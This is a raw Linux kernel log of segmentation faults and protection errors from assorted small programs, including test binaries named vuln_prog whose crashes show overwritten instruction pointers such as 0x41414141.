[4783359.394154] a.out[5352]: segfault at 0 ip 00007f7f2d3426f8 sp 00007ffd6f90ee70 error 4 in libc-2.23.so[7f7f2d2d4000+1c0000]
[4783530.515306] a.out[5399]: segfault at 0 ip 00007ff7af96c6f8 sp 00007ffcf78e7a30 error 4 in libc-2.23.so[7ff7af8fe000+1c0000]
[4783650.278739] oocmerge[5492]: segfault at 0 ip 00007f6cfb3196f8 sp 00007ffe4118ad00 error 4 in libc-2.23.so[7f6cfb2ab000+1c0000]
[4783660.674336] oocmerge[5505]: segfault at 0 ip 00007f05c71f51ba sp 00007fff8402efc0 error 4 in libc-2.23.so[7f05c7187000+1c0000]
[4783752.392146] oocmerge[5544]: segfault at 0 ip 00007fa34ec1f6f8 sp 00007fff57f251c0 error 4 in libc-2.23.so[7fa34ebb1000+1c0000]
[4783755.005069] oocmerge[5548]: segfault at 0 ip 00007fdcc57e76f8 sp 00007ffddb5aca70 error 4 in libc-2.23.so[7fdcc5779000+1c0000]
[4783806.887844] a.out[5570]: segfault at 0 ip 00007f6e6fa586f8 sp 00007ffd48c59830 error 4 in libc-2.23.so[7f6e6f9ea000+1c0000]
[4783892.059883] oocmerge[5585]: segfault at 0 ip 00007f52b9e146f8 sp 00007ffd1eeaee50 error 4 in libc-2.23.so[7f52b9da6000+1c0000]
[4783922.073286] oocmerge[5625]: segfault at 0 ip 00007fb8fdb906f8 sp 00007ffe2a74d990 error 4 in libc-2.23.so[7fb8fdb22000+1c0000]
[4783923.744843] oocmerge[5627]: segfault at 0 ip 00007f7a156e96f8 sp 00007ffcd3edd9a0 error 4 in libc-2.23.so[7f7a1567b000+1c0000]
[4783924.530017] oocmerge[5629]: segfault at 0 ip 00007f15a214b6f8 sp 00007fffc723bdb0 error 4 in libc-2.23.so[7f15a20dd000+1c0000]
[4783926.819413] oocmerge[5632]: segfault at 0 ip 00007f08e52f56f8 sp 00007ffc4354af80 error 4 in libc-2.23.so[7f08e5287000+1c0000]
[4783929.583718] oocmerge[5635]: segfault at 0 ip 00007f78e7116c4f sp 00007ffe5d449fc0 error 4 in libc-2.23.so[7f78e70a1000+1c0000]
[4783933.323447] oocmerge[5637]: segfault at 0 ip 00007f77cc4916f8 sp 00007ffe3afc3f10 error 4 in libc-2.23.so[7f77cc423000+1c0000]
[4783936.136980] oocmerge[5639]: segfault at 0 ip 00007f0ef7db16f8 sp 00007ffc80707f10 error 4 in libc-2.23.so[7f0ef7d43000+1c0000]
[4784034.370112] oocmerge[5687]: segfault at 0 ip 00007fbc2c1fb1ba sp 00007ffc7fb38010 error 4 in libc-2.23.so[7fbc2c18d000+1c0000]
[4784039.854342] oocmerge[5690]: segfault at 0 ip 00007f928585e6f8 sp 00007fff92abe530 error 4 in libc-2.23.so[7f92857f0000+1c0000]
[4784041.052640] oocmerge[5692]: segfault at 0 ip 00007fe56e8566f8 sp 00007ffc5fc90a00 error 4 in libc-2.23.so[7fe56e7e8000+1c0000]
[4784041.883509] oocmerge[5694]: segfault at 0 ip 00007f8230ecf6f8 sp 00007ffff9cb27b0 error 4 in libc-2.23.so[7f8230e61000+1c0000]
[4784042.549054] oocmerge[5696]: segfault at 0 ip 00007f56c9fe66f8 sp 00007ffed5fdc570 error 4 in libc-2.23.so[7f56c9f78000+1c0000]
[4784045.942824] oocmerge[5699]: segfault at 0 ip 00007f304045c6f8 sp 00007fffc96edb80 error 4 in libc-2.23.so[7f30403ee000+1c0000]
[4784048.676208] oocmerge[5708]: segfault at 0 ip 00007f89c1725c4f sp 00007ffc41119160 error 4 in libc-2.23.so[7f89c16b0000+1c0000]
[4784051.500046] oocmerge[5710]: segfault at 0 ip 00007fa8e553bc4f sp 00007fff8cf3e610 error 4 in libc-2.23.so[7fa8e54c6000+1c0000]
[4784053.740370] oocmerge[5712]: segfault at 0 ip 00007f016a09fc4f sp 00007ffc1028bf70 error 4 in libc-2.23.so[7f016a02a000+1c0000]
[4784056.325058] oocmerge[5715]: segfault at 0 ip 00007f682f89e6f8 sp 00007ffecf1a3c80 error 4 in libc-2.23.so[7f682f830000+1c0000]
[4784109.414810] a.out[5738]: segfault at 0 ip 00007ff8bf46e6f8 sp 00007ffd9f1c8cf0 error 4 in libc-2.23.so[7ff8bf400000+1c0000]
[4784465.776106] a.out[5953]: segfault at 0 ip 00007f7f8c25b6f8 sp 00007ffc83590b90 error 4 in libc-2.23.so[7f7f8c1ed000+1c0000]
[4784614.412064] a.out[5984]: segfault at 0 ip 00007f918632a6f8 sp 00007ffdc7be5f30 error 4 in libc-2.23.so[7f91862bc000+1c0000]
[4785745.737534] a.out[6246]: segfault at 0 ip 00007f72af1696f8 sp 00007fff22e0ec10 error 4 in libc-2.23.so[7f72af0fb000+1c0000]
[4785754.258323] a.out[6253]: segfault at 0 ip 00007f6f642266f8 sp 00007ffc1ef92a70 error 4 in libc-2.23.so[7f6f641b8000+1c0000]
[4785841.863629] a.out[6269]: segfault at 0 ip 00007fe16eeeb6f8 sp 00007ffd82fbaab0 error 4 in libc-2.23.so[7fe16ee7d000+1c0000]
[4785845.834112] a.out[6277]: segfault at 0 ip 00007f45b18b26f8 sp 00007ffd16131680 error 4 in libc-2.23.so[7f45b1844000+1c0000]
[4785876.114680] a.out[6296]: segfault at 0 ip 00007fb81412e6f8 sp 00007fffacbc3ff0 error 4 in libc-2.23.so[7fb8140c0000+1c0000]
[4785943.640415] a.out[6314]: segfault at 0 ip 00007fa1698806f8 sp 00007ffd9bc653c0 error 4 in libc-2.23.so[7fa169812000+1c0000]
[4785982.013742] a.out[6328]: segfault at 0 ip 00007f627627a6f8 sp 00007ffc88244210 error 4 in libc-2.23.so[7f627620c000+1c0000]
[4786053.764857] a.out[6346]: segfault at 0 ip 00007fc1fe6196f8 sp 00007ffda185dee0 error 4 in libc-2.23.so[7fc1fe5ab000+1c0000]
[4788064.538590] oocmerge[7594]: segfault at 2ec25c24 ip 0000000000400b44 sp 00007fffff958e50 error 6 in oocmerge[400000+2000]
[4788136.835208] oocmerge[7647]: segfault at 515850d ip 0000000000400b44 sp 00007ffef0683fd0 error 6 in oocmerge[400000+2000]
[4788181.599560] oocmerge[7664]: segfault at 0 ip 0000000000400b5d sp 00007ffc5ed75900 error 6 in oocmerge[400000+2000]
[4788250.217931] oocmerge[7694]: segfault at 0 ip 0000000000400b5d sp 00007ffccf32ac40 error 6 in oocmerge[400000+2000]
[4788370.058950] oocmerge[7736]: segfault at 0 ip 0000000000400b5d sp 00007ffdb5d19c70 error 6 in oocmerge[400000+2000]
[4789434.230828] a.out[8330]: segfault at 0 ip 00007fd5d68901ba sp 00007ffd031d8310 error 4 in libc-2.23.so[7fd5d6822000+1c0000]
[4798438.992781] oocmerge[12259]: segfault at 0 ip 00007f03fd9d81ba sp 00007ffd8d658f70 error 4 in libc-2.23.so[7f03fd96a000+1c0000]
[4798497.349745] oocmerge[12294]: segfault at 401246 ip 0000000000400a6b sp 00007fffbd7f8200 error 7 in oocmerge[400000+2000]
[4802226.424050] waterjugpuzzle[14569]: segfault at 19 ip 00007f0511c7a512 sp 00007ffcf527ea40 error 4 in libc-2.23.so[7f0511bf6000+1c0000]
[4802226.543787] waterjugpuzzle[14573]: segfault at 39 ip 00007ff44b7ad512 sp 00007ffce7282f80 error 4 in libc-2.23.so[7ff44b729000+1c0000]
[4802226.666875] waterjugpuzzle[14577]: segfault at 19 ip 00007f16bf508512 sp 00007fff602dbc60 error 4 in libc-2.23.so[7f16bf484000+1c0000]
[4802226.787428] waterjugpuzzle[14582]: segfault at 19 ip 00007fad6a143512 sp 00007fff9b2e0d40 error 4 in libc-2.23.so[7fad6a0bf000+1c0000]
[4802226.903640] waterjugpuzzle[14586]: segfault at 19 ip 00007f2c97c7f512 sp 00007ffede084380 error 4 in libc-2.23.so[7f2c97bfb000+1c0000]
[4802227.067956] waterjugpuzzle[14590]: segfault at 19 ip 00007f86a44e1512 sp 00007ffe990a4120 error 4 in libc-2.23.so[7f86a445d000+1c0000]
[4802227.186441] waterjugpuzzle[14594]: segfault at 19 ip 00007feb4fdd6512 sp 00007ffd5359c940 error 4 in libc-2.23.so[7feb4fd52000+1c0000]
[4802227.347867] waterjugpuzzle[14598]: segfault at 19 ip 00007fa9516f8512 sp 00007ffc013a2be0 error 4 in libc-2.23.so[7fa951674000+1c0000]
[4802227.480106] waterjugpuzzle[14602]: segfault at 19 ip 00007fc961a48512 sp 00007ffd2b20b970 error 4 in libc-2.23.so[7fc9619c4000+1c0000]
[4802227.598270] waterjugpuzzle[14606]: segfault at 19 ip 00007f67339d6512 sp 00007fff65828ec0 error 4 in libc-2.23.so[7f6733952000+1c0000]
[4802551.862441] show_signal_msg: 3 callbacks suppressed
[4802551.862448] waterjugpuzzle[14926]: segfault at 19 ip 00007f0a3ee72512 sp 00007fff45355950 error 4 in libc-2.23.so[7f0a3edee000+1c0000]
[4802552.015939] waterjugpuzzle[14930]: segfault at 39 ip 00007fb9ec7f6512 sp 00007fffd9bfd830 error 4 in libc-2.23.so[7fb9ec772000+1c0000]
[4802552.162826] waterjugpuzzle[14934]: segfault at 19 ip 00007f2bb79bd512 sp 00007ffc6027fed0 error 4 in libc-2.23.so[7f2bb7939000+1c0000]
[4802552.308934] waterjugpuzzle[14938]: segfault at 19 ip 00007ff2f9458512 sp 00007ffd8e2cbef0 error 4 in libc-2.23.so[7ff2f93d4000+1c0000]
[4802552.474231] waterjugpuzzle[14942]: segfault at 19 ip 00007f5925184512 sp 00007ffc0cd50ba0 error 4 in libc-2.23.so[7f5925100000+1c0000]
[4802552.619797] waterjugpuzzle[14946]: segfault at 19 ip 00007efd6ad10512 sp 00007ffdebafe6c0 error 4 in libc-2.23.so[7efd6ac8c000+1c0000]
[4802552.765267] waterjugpuzzle[14950]: segfault at 19 ip 00007fd3400a8512 sp 00007fff1784af10 error 4 in libc-2.23.so[7fd340024000+1c0000]
[4802552.916342] waterjugpuzzle[14954]: segfault at 19 ip 00007f9aa85a9512 sp 00007ffd24049d60 error 4 in libc-2.23.so[7f9aa8525000+1c0000]
[4802553.060057] waterjugpuzzle[14958]: segfault at 19 ip 00007f4d9e5ac512 sp 00007ffce95a0850 error 4 in libc-2.23.so[7f4d9e528000+1c0000]
[4802553.223715] waterjugpuzzle[14962]: segfault at 19 ip 00007fd2d3b7d512 sp 00007ffe85a309d0 error 4 in libc-2.23.so[7fd2d3af9000+1c0000]
[4844431.125149] show_signal_msg: 3 callbacks suppressed
[4844431.125155] waterjugpuzzle[26863]: segfault at 160 ip 00007fa866b1d9bb sp 00007ffe28a3f728 error 4 in libstdc++.so.6.0.21[7fa8669fc000+172000]
[4856891.491649] vuln_prog2.bin[31197]: segfault at 0 ip 00007fec3c4cbbf7 sp 00007ffcff22ff18 error 4 in libc-2.23.so[7fec3c426000+1c0000]
[4869491.063497] oocmerge[2769]: segfault at 228 ip 00007f89af5a867b sp 00007ffdceb05260 error 6 in libc-2.23.so[7f89af52d000+1c0000]
[4869494.266869] oocmerge[2771]: segfault at 228 ip 00007fbb9766767b sp 00007ffd3fa60600 error 6 in libc-2.23.so[7fbb975ec000+1c0000]
[4926805.921714] vuln_prog3.bin[7015]: segfault at f7e02a67 ip 00000000f7e02a67 sp 00000000ffffdac0 error 14
[4926835.405387] vuln_prog3.bin[7089]: segfault at f7e02a67 ip 00000000f7e02a67 sp 00000000ffffdac0 error 14
[4926841.905276] vuln_prog3.bin[7146]: segfault at f7e02a67 ip 00000000f7e02a67 sp 00000000ffffdac0 error 14
[4926881.660410] vuln_prog3.bin[7193]: segfault at f7e02a67 ip 00000000f7e02a67 sp 00000000ffffdab0 error 14
[4926893.784857] vuln_prog3.bin[7230]: segfault at f7e02a67 ip 00000000f7e02a67 sp 00000000ffffdac0 error 14
[4926934.418178] vuln_prog3.bin[7261]: segfault at f7e02a67 ip 00000000f7e02a67 sp 00000000ffffdaa0 error 14
[4927366.323983] vuln_prog3.bin[7337]: segfault at f7e02a67 ip 00000000f7e02a67 sp 00000000ffffdaa0 error 14
[4928107.141774] vuln_prog3.bin[7746]: segfault at f7e02a67 ip 00000000f7e02a67 sp 00000000ffffdac0 error 14
[4928316.875226] vuln_prog3.bin[7775]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdae0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[4928730.385746] vuln_prog3.bin[7818]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdae0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[4928824.740048] vuln_prog3.bin[8280]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdad0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[4928855.188853] vuln_prog3.bin[8299]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdad0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[4941685.534023] waterjugpuzzle[12941]: segfault at 160 ip 00007f48bbd0b9bb sp 00007ffc1481d6a8 error 4 in libstdc++.so.6.0.21[7f48bbbea000+172000]
[4958552.592324] vuln_prog3.bin[17790]: segfault at f7ebca80 ip 00000000f7ebca80 sp 00000000ff843490 error 14
[4958630.822552] vuln_prog3.bin[17891]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda84 error 14
[4958921.782722] vuln_prog3.bin[17951]: segfault at f7ebca80 ip 00000000f7ebca80 sp 00000000ffd94990 error 14
[4958971.300121] vuln_prog3.bin[18109]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda84 error 14
[4959114.196206] vuln_prog3.bin[18168]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda84 error 14
[5037502.858466] quickselect[15203]: segfault at 7ffc0a371ff8 ip 0000000000401b09 sp 00007ffc0a372000 error 6 in quickselect[400000+3000]
[5037503.114798] quickselect[15242]: segfault at 7ffd7538cff8 ip 0000000000401b09 sp 00007ffd7538d000 error 6 in quickselect[400000+3000]
[5037503.319997] quickselect[15262]: segfault at 7ffc47e69ff8 ip 0000000000401b09 sp 00007ffc47e6a000 error 6 in quickselect[400000+3000]
[5037503.693090] quickselect[15339]: segfault at 7ffc092faff8 ip 0000000000401b09 sp 00007ffc092fb000 error 6 in quickselect[400000+3000]
[5037504.013672] quickselect[15397]: segfault at 7ffc4e406ff8 ip 0000000000401b94 sp 00007ffc4e407000 error 6 in quickselect[400000+3000]
[5037504.511290] quickselect[15418]: segfault at 7fffc8468ff8 ip 0000000000401b94 sp 00007fffc8469000 error 6 in quickselect[400000+3000]
[5037504.984234] quickselect[15439]: segfault at 7ffca06caff8 ip 0000000000401b09 sp 00007ffca06cb000 error 6 in quickselect[400000+3000]
[5037573.665555] quickselect[15493]: segfault at 7fff273afff8 ip 0000000000401b94 sp 00007fff273b0000 error 6 in quickselect[400000+3000]
[5038600.398147] quickselect[16207]: segfault at 7ffcc92f3ff8 ip 0000000000402013 sp 00007ffcc92f4000 error 6 in quickselect[400000+4000]
[5038601.282976] quickselect[16341]: segfault at 7ffcf6d2fff8 ip 0000000000402043 sp 00007ffcf6d30000 error 6 in quickselect[400000+4000]
[5038602.177199] quickselect[16362]: segfault at 7ffd1d45fff8 ip 0000000000402025 sp 00007ffd1d45fff0 error 6 in quickselect[400000+4000]
[5038602.842499] quickselect[16383]: segfault at 7fff442c0fe8 ip 0000000000402025 sp 00007fff442c0fe0 error 6 in quickselect[400000+4000]
[5038645.218212] quickselect[16708]: segfault at 7fff7c8b3ff8 ip 0000000000402025 sp 00007fff7c8b3ff0 error 6 in quickselect[400000+4000]
[5038645.775465] quickselect[16842]: segfault at 7ffd6769cfe8 ip 0000000000402025 sp 00007ffd6769cfe0 error 6 in quickselect[400000+4000]
[5038646.262032] quickselect[16863]: segfault at 7fff55c17fe8 ip 0000000000402025 sp 00007fff55c17fe0 error 6 in quickselect[400000+4000]
[5038647.079179] quickselect[16884]: segfault at 7fff1ee39ff8 ip 0000000000402013 sp 00007fff1ee3a000 error 6 in quickselect[400000+4000]
[5038743.426180] quickselect[16927]: segfault at 7fff1ca7bfe8 ip 0000000000402025 sp 00007fff1ca7bfe0 error 6 in quickselect[400000+4000]
[5039091.739920] quickselect[17398]: segfault at 7ffd9c384ff8 ip 000000000040200c sp 00007ffd9c385000 error 6 in quickselect[400000+4000]
[5039092.008124] quickselect[17456]: segfault at 7ffd977f7ff8 ip 000000000040200c sp 00007ffd977f8000 error 6 in quickselect[400000+4000]
[5039092.499228] quickselect[17477]: segfault at 7ffd60594ff8 ip 000000000040203c sp 00007ffd60595000 error 6 in quickselect[400000+4000]
[5039093.221905] quickselect[17498]: segfault at 7ffdc9b59ff8 ip 000000000040203c sp 00007ffdc9b5a000 error 6 in quickselect[400000+4000]
[5039114.279247] quickselect[17899]: segfault at 7ffdd9f83ff8 ip 000000000040201e sp 00007ffdd9f83ff0 error 6 in quickselect[400000+4000]
[5039114.534863] quickselect[17957]: segfault at 7ffc6cc9bff8 ip 000000000040200c sp 00007ffc6cc9c000 error 6 in quickselect[400000+4000]
[5039114.994548] quickselect[17979]: segfault at 7fff8be5cff8 ip 000000000040200c sp 00007fff8be5d000 error 6 in quickselect[400000+4000]
[5039115.731936] quickselect[18000]: segfault at 7ffe4ff8cfe8 ip 000000000040201e sp 00007ffe4ff8cfe0 error 6 in quickselect[400000+4000]
[5039278.291720] quickselect[18820]: segfault at 7ffe70c82ff8 ip 0000000000402043 sp 00007ffe70c83000 error 6 in quickselect[400000+4000]
[5039279.029003] quickselect[18954]: segfault at 7ffd03988ff8 ip 0000000000402043 sp 00007ffd03989000 error 6 in quickselect[400000+4000]
[5039279.582491] quickselect[18975]: segfault at 7ffd80454ff8 ip 0000000000402043 sp 00007ffd80455000 error 6 in quickselect[400000+4000]
[5039280.322603] quickselect[18997]: segfault at 7ffc88d0afe8 ip 0000000000402025 sp 00007ffc88d0afe0 error 6 in quickselect[400000+4000]
[5039346.885434] quickselect[19333]: segfault at 7ffdea269fe8 ip 0000000000402025 sp 00007ffdea269fe0 error 6 in quickselect[400000+4000]
[5039347.376193] quickselect[19467]: segfault at 7ffce6bb5ff8 ip 0000000000402043 sp 00007ffce6bb6000 error 6 in quickselect[400000+4000]
[5039347.858596] quickselect[19488]: segfault at 7fffe8fd6ff8 ip 0000000000402025 sp 00007fffe8fd6ff0 error 6 in quickselect[400000+4000]
[5039348.520152] quickselect[19509]: segfault at 7ffffb8adff8 ip 0000000000402025 sp 00007ffffb8adff0 error 6 in quickselect[400000+4000]
[5039437.876743] quickselect[20318]: segfault at 7ffe11236ff8 ip 0000000000401f96 sp 00007ffe11236ff0 error 6 in quickselect[400000+4000]
[5039438.413479] quickselect[20452]: segfault at 7ffc91123fe8 ip 0000000000401f96 sp 00007ffc91123fe0 error 6 in quickselect[400000+4000]
[5039438.990504] quickselect[20473]: segfault at 7ffc9b438ff8 ip 0000000000401fb4 sp 00007ffc9b439000 error 6 in quickselect[400000+4000]
[5039439.677790] quickselect[20494]: segfault at 7ffc8f76efe8 ip 0000000000401f96 sp 00007ffc8f76efe0 error 6 in quickselect[400000+4000]
[5039544.718459] quickselect[22381]: segfault at 7fffe12efff8 ip 000000000040200c sp 00007fffe12f0000 error 6 in quickselect[400000+4000]
[5039545.038443] quickselect[22439]: segfault at 7ffdf9728ff8 ip 000000000040200c sp 00007ffdf9729000 error 6 in quickselect[400000+4000]
[5039545.584272] quickselect[22460]: segfault at 7ffe76012ff8 ip 000000000040203c sp 00007ffe76013000 error 6 in quickselect[400000+4000]
[5039546.239709] quickselect[22481]: segfault at 7ffc0056bff8 ip 000000000040203c sp 00007ffc0056c000 error 6 in quickselect[400000+4000]
[5039587.700176] quickselect[22814]: segfault at 7ffec5e0cff8 ip 000000000040201e sp 00007ffec5e0cff0 error 6 in quickselect[400000+4000]
[5039588.208670] quickselect[22948]: segfault at 7fffba648fe8 ip 000000000040201e sp 00007fffba648fe0 error 6 in quickselect[400000+4000]
[5039588.736238] quickselect[22972]: segfault at 7fff4daecff8 ip 000000000040203c sp 00007fff4daed000 error 6 in quickselect[400000+4000]
[5039589.511771] quickselect[22993]: segfault at 7ffdf3386ff8 ip 000000000040200c sp 00007ffdf3387000 error 6 in quickselect[400000+4000]
[5039600.143367] quickselect[23388]: segfault at 7ffd46a5bfe8 ip 0000000000402014 sp 00007ffd46a5bfe0 error 6 in quickselect[400000+4000]
[5039600.476931] quickselect[23446]: segfault at 7fff17634ff8 ip 0000000000402032 sp 00007fff17635000 error 6 in quickselect[400000+4000]
[5039600.995920] quickselect[23467]: segfault at 7ffc001c5ff8 ip 0000000000402014 sp 00007ffc001c5ff0 error 6 in quickselect[400000+4000]
[5039601.799691] quickselect[23488]: segfault at 7ffcfab9cff8 ip 0000000000402002 sp 00007ffcfab9d000 error 6 in quickselect[400000+4000]
[5039627.216526] quickselect[23884]: segfault at 7ffe7bac0ff8 ip 0000000000402032 sp 00007ffe7bac1000 error 6 in quickselect[400000+4000]
[5039627.530887] quickselect[23942]: segfault at 7ffe9da94ff8 ip 0000000000402014 sp 00007ffe9da94ff0 error 6 in quickselect[400000+4000]
[5039628.013067] quickselect[23963]: segfault at 7fffdee92ff8 ip 0000000000402014 sp 00007fffdee92ff0 error 6 in quickselect[400000+4000]
[5039628.614547] quickselect[23984]: segfault at 7ffdb35e4fe8 ip 0000000000402014 sp 00007ffdb35e4fe0 error 6 in quickselect[400000+4000]
[5039911.004452] quickselect[24741]: segfault at 7ffd44020fe8 ip 0000000000402020 sp 00007ffd44020fe0 error 6 in quickselect[400000+4000]
[5039911.510376] quickselect[24875]: segfault at 7fffe6abcfe8 ip 0000000000402020 sp 00007fffe6abcfe0 error 6 in quickselect[400000+4000]
[5039912.079290] quickselect[24896]: segfault at 7ffc3eef2ff8 ip 000000000040203e sp 00007ffc3eef3000 error 6 in quickselect[400000+4000]
[5039912.808485] quickselect[24917]: segfault at 7fff9bd51ff8 ip 000000000040200e sp 00007fff9bd52000 error 6 in quickselect[400000+4000]
[5039922.905045] quickselect[25319]: segfault at 7fff9e41fff8 ip 0000000000402016 sp 00007fff9e41fff0 error 6 in quickselect[400000+4000]
[5039923.233857] quickselect[25377]: segfault at 7fff2d8befe8 ip 0000000000402016 sp 00007fff2d8befe0 error 6 in quickselect[400000+4000]
[5039924.018007] quickselect[25398]: segfault at 7fff0f61eff8 ip 0000000000402034 sp 00007fff0f61f000 error 6 in quickselect[400000+4000]
[5039924.727448] quickselect[25419]: segfault at 7ffe8ced2ff8 ip 0000000000402034 sp 00007ffe8ced3000 error 6 in quickselect[400000+4000]
[5039935.455242] quickselect[25738]: segfault at 7ffff2061ff8 ip 0000000000402016 sp 00007ffff2061ff0 error 6 in quickselect[400000+4000]
[5039935.940460] quickselect[25872]: segfault at 7fff4a5f8ff8 ip 0000000000402016 sp 00007fff4a5f8ff0 error 6 in quickselect[400000+4000]
[5039936.470542] quickselect[25893]: segfault at 7ffd991e5ff8 ip 0000000000402016 sp 00007ffd991e5ff0 error 6 in quickselect[400000+4000]
[5039937.654192] quickselect[25914]: segfault at 7fff28030ff8 ip 0000000000402004 sp 00007fff28031000 error 6 in quickselect[400000+4000]
[5039952.388297] quickselect[26455]: segfault at 7ffce27c8ff8 ip 000000000040200f sp 00007ffce27c8ff0 error 6 in quickselect[400000+4000]
[5039952.784848] quickselect[26513]: segfault at 7ffdf0543ff8 ip 000000000040200f sp 00007ffdf0543ff0 error 6 in quickselect[400000+4000]
[5039953.371689] quickselect[26534]: segfault at 7ffd3f797ff8 ip 000000000040200f sp 00007ffd3f797ff0 error 6 in quickselect[400000+4000]
[5039954.150108] quickselect[26555]: segfault at 7ffeb5899fe8 ip 000000000040200f sp 00007ffeb5899fe0 error 6 in quickselect[400000+4000]
[5040016.572909] quickselect[26961]: segfault at 7ffdc0ccbff8 ip 000000000040202d sp 00007ffdc0ccc000 error 6 in quickselect[400000+4000]
[5040016.891923] quickselect[27019]: segfault at 7ffcd3610ff8 ip 000000000040202d sp 00007ffcd3611000 error 6 in quickselect[400000+4000]
[5040017.740084] quickselect[27040]: segfault at 7ffd65f79fe8 ip 000000000040200f sp 00007ffd65f79fe0 error 6 in quickselect[400000+4000]
[5040018.522228] quickselect[27061]: segfault at 7ffd50f12ff8 ip 000000000040202d sp 00007ffd50f13000 error 6 in quickselect[400000+4000]
[5040065.025893] quickselect[28022]: segfault at 7ffce700cff8 ip 0000000000402002 sp 00007ffce700d000 error 6 in quickselect[400000+4000]
[5040065.480829] quickselect[28080]: segfault at 7ffd556bcff8 ip 0000000000402002 sp 00007ffd556bd000 error 6 in quickselect[400000+4000]
[5040066.374651] quickselect[28101]: segfault at 7fffcfca8ff8 ip 0000000000402032 sp 00007fffcfca9000 error 6 in quickselect[400000+4000]
[5040067.059839] quickselect[28122]: segfault at 7fff7dd82ff8 ip 0000000000402002 sp 00007fff7dd83000 error 6 in quickselect[400000+4000]
[5040100.809094] quickselect[28530]: segfault at 7ffceb1b0fe8 ip 000000000040200f sp 00007ffceb1b0fe0 error 6 in quickselect[400000+4000]
[5040101.353802] quickselect[28588]: segfault at 7ffdd5da6ff8 ip 000000000040200f sp 00007ffdd5da6ff0 error 6 in quickselect[400000+4000]
[5040101.899226] quickselect[28609]: segfault at 7fffbdfa9ff8 ip 000000000040202d sp 00007fffbdfaa000 error 6 in quickselect[400000+4000]
[5040102.653381] quickselect[28630]: segfault at 7ffc534b1ff8 ip 0000000000401ffd sp 00007ffc534b2000 error 6 in quickselect[400000+4000]
[5040159.386593] quickselect[29043]: segfault at 25ec000 ip 00000000004016dd sp 00007fffca54b2b0 error 4 in quickselect[400000+4000]
[5040159.569173] quickselect[29063]: segfault at 1d49000 ip 00000000004016dd sp 00007fffec28ce80 error 4 in quickselect[400000+4000]
[5040365.080324] quickselect[29558]: segfault at 1941000 ip 00000000004016dd sp 00007ffea90599a0 error 4 in quickselect[400000+4000]
[5040365.273685] quickselect[29578]: segfault at 211c000 ip 00000000004016dd sp 00007ffe3debedf0 error 4 in quickselect[400000+4000]
[5040377.998432] quickselect[30050]: segfault at 23dc000 ip 00000000004016dd sp 00007ffc35443d50 error 4 in quickselect[400000+4000]
[5040378.509242] quickselect[30075]: segfault at 12c2000 ip 00000000004016dd sp 00007ffe087162d0 error 4 in quickselect[400000+4000]
[5110989.994390] vuln_prog[20475]: segfault at 7fffffffc4a0 ip 00007fffffffc4a0 sp 00007ffd23c7a280 error 14
[5111519.224350] traps: vuln_prog[20640] general protection ip:400710 sp:7ffd706eef88 error:0 in vuln_prog[400000+1000]
[5111550.501997] traps: vuln_prog[20648] general protection ip:400710 sp:7ffef480cd78 error:0 in vuln_prog[400000+1000]
[5111555.091910] traps: vuln_prog[20652] general protection ip:400710 sp:7ffeea3152e8 error:0 in vuln_prog[400000+1000]
[5111615.342504] traps: vuln_prog[20671] general protection ip:400710 sp:7ffd17a94de8 error:0 in vuln_prog[400000+1000]
[5111627.472239] traps: vuln_prog[20679] general protection ip:400710 sp:7fffffffe108 error:0 in vuln_prog[400000+1000]
[5111854.587918] traps: vuln_prog[20854] general protection ip:400710 sp:7fffffffe108 error:0 in vuln_prog[400000+1000]
[5118073.978910] vuln_prog3.bin[23503]: segfault at ffffdc42 ip 00000000ffffdc42 sp 00000000ffffda60 error 15
[5119040.613962] vuln_prog3[23952]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffa54030 error 14
[5119044.839010] vuln_prog3[23955]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffd3c580 error 14
[5119159.716982] vuln_prog3[24167]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffd7ca00 error 14
[5119162.555091] vuln_prog3[24170]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffdea0f0 error 14
[5119644.837633] vuln_prog.bin[24857]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdad0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[5120173.549078] vuln_prog.bin[25477]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdad0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[5120217.391057] vuln_prog.bin[25590]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdad0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[5120411.018003] vuln_prog.bin[26277]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdaf0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[5120499.217114] vuln_prog3.bin[26349]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdaf0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[5120612.696828] vuln_prog3.bin[26396]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdaf0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[5120627.054227] vuln_prog3.bin[26475]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdaf0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[5120800.106670] vuln_prog1.bin[26660]: segfault at 7fffffffea38 ip 00007fffffffea38 sp 00007fffffffe938 error 15
[5120967.732296] vuln_prog3.bin[26499]: segfault at 4f0ec50d ip 00000000f7e0ec89 sp 00000000ffffdaf0 error 4 in libc-2.23.so[f7e0c000+1b0000]
[5121928.529943] traps: vuln_prog2.bin[28488] general protection ip:7f25e0958cc0 sp:7fff200992a0 error:0 in libc-2.23.so[7f25e090a000+1c0000]
[5122550.973697] vuln_prog1.bin[28738]: segfault at 7fffffffea38 ip 00007fffffffea38 sp 00007fffffffe938 error 15
[5140481.481372] vuln_prog3.bin[2484]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda64 error 14
[5141002.450325] vuln_prog3.bin[2764]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffda64 error 14
